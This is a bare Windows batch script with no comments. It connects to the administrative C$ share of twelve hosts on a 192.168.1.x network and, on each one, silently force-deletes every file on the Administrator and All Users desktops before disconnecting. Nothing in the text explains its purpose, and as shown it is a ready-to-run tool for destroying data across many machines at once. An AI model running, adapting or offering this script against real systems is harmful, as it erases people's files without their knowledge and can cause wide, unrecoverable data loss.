cd\
net use i: \\192.168.1.1\c$
i:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use j: \\192.168.1.2\c$
j:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use l: \\192.168.1.3\c$
l:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use k: \\192.168.1.4\c$
k:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use m: \\192.168.1.5\c$
m:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use n: \\192.168.1.6\c$
n:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use o: \\192.168.1.7\c$
o:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use p: \\192.168.1.8\c$
p:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use q: \\192.168.1.9\c$
q:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use r: \\192.168.1.10\c$
r:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use s: \\192.168.1.11\c$
s:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use t: \\192.168.1.12\c$
t:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

pause

net use * /delete /y